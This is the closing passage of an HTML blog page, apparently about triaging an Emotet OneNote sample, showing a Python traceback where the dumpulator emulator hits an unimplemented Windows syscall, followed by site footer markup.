<span class="ansi-green-intense-fg ansi-bold">   1605</span>                     print<span class="ansi-blue-fg">(</span><span class="ansi-blue-fg">"context switch, stopping emulation"</span><span class="ansi-blue-fg">)</span>

<span class="ansi-green-fg">~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/ntsyscalls.py</span> in <span class="ansi-cyan-fg">ZwQueryInformationJobObject</span><span class="ansi-blue-fg">(dp, JobHandle, JobObjectInformationClass, JobObjectInformation, JobObjectInformationLength, ReturnLength)</span>
<span class="ansi-green-intense-fg ansi-bold">   2972</span>                                 ReturnLength<span class="ansi-blue-fg">:</span> Annotated<span class="ansi-blue-fg">[</span>P<span class="ansi-blue-fg">[</span>ULONG<span class="ansi-blue-fg">]</span><span class="ansi-blue-fg">,</span> SAL<span class="ansi-blue-fg">(</span><span class="ansi-blue-fg">"_Out_opt_"</span><span class="ansi-blue-fg">)</span><span class="ansi-blue-fg">]</span>
<span class="ansi-green-intense-fg ansi-bold">   2973</span>                                 ):
<span class="ansi-green-fg">-&gt; 2974</span><span class="ansi-red-fg">     </span><span class="ansi-green-fg">raise</span> NotImplementedError<span class="ansi-blue-fg">(</span><span class="ansi-blue-fg">)</span>
<span class="ansi-green-intense-fg ansi-bold">   2975</span> 
<span class="ansi-green-intense-fg ansi-bold">   2976</span> <span class="ansi-blue-fg">@</span>syscall

<span class="ansi-red-fg">NotImplementedError</span>: </pre>
</div>
</div>

</div>
</div>

</div>
    

</div>



  </div><a class="u-url" href="/onenote/emotet/wsf/triage/2023/03/19/onenote.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
      </div>
      <div class="footer-col">
        <p></p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
